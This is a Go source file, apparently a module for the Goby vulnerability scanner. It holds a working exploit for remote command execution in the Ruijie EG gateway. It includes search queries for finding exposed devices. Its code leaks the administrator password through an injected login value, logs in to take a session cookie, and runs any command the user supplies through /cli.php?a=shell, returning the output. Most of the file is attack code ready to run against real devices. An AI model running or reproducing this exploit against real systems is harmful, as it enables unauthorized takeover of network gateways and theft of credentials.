package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Ruijie EG cli.php rce",
    "Description": "Attackers can use sandbox commands to obtain administrator account passwords, log in to the system, execute commands, and control the entire device.",
    "Impact": "Ruijie EG cli.php rce",
    "Recommendation": "<p>1. Please contact the manufacturer to fix the vulnerability: <a href=\"http://www.ruijie.com.cn/\">http://www.ruijie.com. cn/</a></p><p>2. If it is not necessary, it is forbidden to access the device from the public network. </p><p>3. Set access policies and whitelist access through security devices such as firewalls. </p>",
    "Product": "Ruijie-EG",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "锐捷EG易网关后台命令执行漏洞",
            "Description": "EasyGate易网关是锐捷网络公司推出的一款解决当下网络出口难题的多业务综合网关产品。锐捷EG易网关后台某文件存在命令执行漏洞，会导致设备被getshell。",
            "Impact": "<p>攻击者可利用该漏洞获取管理员账号密码，登录系统后可执行任意系统命令，会导致设备被getshell。<br></p>",
            "Recommendation": "<p>1、请用户联系厂商修复漏洞：<a href=\"http://www.ruijie.com.cn/\" target=\"_blank\">http://www.ruijie.com.cn/</a></p><p>2、如非必要，禁止公网访问该设备。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Product": "Ruijie-EG易网关",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Ruijie EG cli.php rce",
            "Description": "Attackers can use sandbox commands to obtain administrator account passwords, log in to the system, execute commands, and control the entire device.",
            "Impact": "Ruijie EG cli.php rce",
            "Recommendation": "<p>1. Please contact the manufacturer to fix the vulnerability: <a href=\"http://www.ruijie.com.cn/\" target=\"_blank\">http://www.ruijie.com. cn/</a></p><p>2. If it is not necessary, it is forbidden to access the device from the public network. </p><p>3. Set access policies and whitelist access through security devices such as firewalls. </p>",
            "Product": "Ruijie-EG",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "(((body=\"ruijie\" && body=\"href=\\\"eg.css\") || body=\"product: ['锐捷网络有限公司 EG易网关\" || (body=\"webchat.ruijie.com.cn\" && body=\"main.htm\" && body=\"4008 111 000\" && body=\"www.ruijie.com.cn/service/know.aspx\")) && body!=\"Server: couchdb\") || (body=\"ruijie\" && body=\"href=\\\"eg.css\") || body=\"product: ['锐捷网络有限公司 EG易网关\" || (body=\"webchat.ruijie.com.cn\" && body=\"main.htm\" && body=\"4008 111 000\" && body=\"www.ruijie.com.cn/service/know.aspx\")",
    "GobyQuery": "(((body=\"ruijie\" && body=\"href=\\\"eg.css\") || body=\"product: ['锐捷网络有限公司 EG易网关\" || (body=\"webchat.ruijie.com.cn\" && body=\"main.htm\" && body=\"4008 111 000\" && body=\"www.ruijie.com.cn/service/know.aspx\")) && body!=\"Server: couchdb\") || (body=\"ruijie\" && body=\"href=\\\"eg.css\") || body=\"product: ['锐捷网络有限公司 EG易网关\" || (body=\"webchat.ruijie.com.cn\" && body=\"main.htm\" && body=\"4008 111 000\" && body=\"www.ruijie.com.cn/service/know.aspx\")",
    "Author": "itardc@163.com",
    "Homepage": "http://www.ruijie.com.cn/",
    "DisclosureDate": "2021-04-18",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10184"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/login.php")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg.Data = "username=admin&password=admin?show+webmaster+user"
			password := ""
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil &&
				resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "admin") {
				result := regexp.MustCompile("admin (.*?)\"").FindStringSubmatch(resp.Utf8Html)
				log.Println(result)
				if len(result) > 1 {
					password = result[1]
				}
			}
			cfg.Data = "username=admin&password=" + password
			cookie := ""
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil &&
				resp.StatusCode == 200 && strings.Contains(resp.HeaderString.String(), "RUIJIEID") {
				log.Println(resp.HeaderString.Lines, resp.HeaderString.String(), resp.Header.Get("Set-Cookie"), resp.Cookie, resp.Cookies())
				cookie = resp.Cookie
			}
			cfg.URI = "/cli.php?a=shell"
			cfg.Header.Store("Cookie", cookie)
			cfg.Data = "notdelay=true&command=echo+\"46F9CBB4666FD9B1\"'09436288A339D72D'"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.StatusCode == 200 {
				return strings.Contains(resp.Utf8Html, "\"status\":true") &&
					strings.Contains(resp.Utf8Html, "46F9CBB4666FD9B109436288A339D72D")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfg := httpclient.NewPostRequestConfig("/login.php")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg.Data = "username=admin&password=admin?show+webmaster+user"
			password := ""
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil &&
				resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "admin") {
				result := regexp.MustCompile("admin (.*?)\"").FindStringSubmatch(resp.Utf8Html)
				log.Println(result)
				if len(result) > 1 {
					password = result[1]
				}
			}
			cfg.Data = "username=admin&password=" + password
			cookie := ""
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil &&
				resp.StatusCode == 200 && strings.Contains(resp.HeaderString.String(), "RUIJIEID") {
				log.Println(resp.HeaderString.Lines, resp.HeaderString.String(), resp.Header.Get("Set-Cookie"), resp.Cookie, resp.Cookies())
				cookie = resp.Cookie
			}
			cmd := ss.Params["cmd"].(string)
			cfg.URI = "/cli.php?a=shell"
			cfg.Header.Store("Cookie", cookie)
			cfg.Data = "notdelay=true&command=" + cmd
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 200 {
				result := regexp.MustCompile(`data\":\[(.*?)\]`).FindStringSubmatch(resp.Utf8Html)
				log.Println(result)
				if len(result) > 1 {
					expResult.Success = true
					expResult.Output = result[1]
				}
			}
			return expResult
		},
	))
}
